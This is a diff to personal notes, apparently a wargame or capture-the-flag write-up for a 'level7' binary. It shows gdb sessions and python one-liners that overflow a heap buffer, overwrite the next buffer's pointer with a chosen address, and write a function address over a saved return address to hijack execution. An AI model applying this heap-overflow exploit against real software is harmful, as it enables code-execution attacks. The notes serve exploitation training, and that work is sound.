@@ -4,3 +4,23 @@ first arg segfault -> AAAAAAAAAAAAAAAAAAAAA (21 ch)
 
 the second buffer look to be influenting eip
 
+AAAAAAAAAAAAAAAAAAAAAAAA
+aaaaaaaaaaaaaaaaaaaaaaaa
+//inspect malloc address : x /40x 0x804a000
+
+#read overflow malloc
+gdb --args level7 $(python -c "print 'A'*7") $(python -c "print 'b'*7")
+b *0x080485bd #just before the second strcpy
+r
+x /40x 0x804a000
+
+0x0804a058 => \x58\xa0\x04x\x08
+
+#we can change the address of the next heap buffer with the first buffer :
+# '\x3c\xa0\x04\x08' is the address of the next heap buffer
+# and the second argument is what we put in this buffer
+
+r $(python -c "print 'A'*20 + '\x3c\xa0\x04\x08'") $(python -c "print 'b'*3")
+
+#trying to change eip : at 0xbffff71c => \x2c\xf7\xff\xbf by m address : 0x080484f4 => \xf4\x84\x04\x08
+r $(python -c "print 'A'*20 + '\x1c\xf7\xff\xbf'") $(python -c "print '\xf4\x84\x04\x08'")
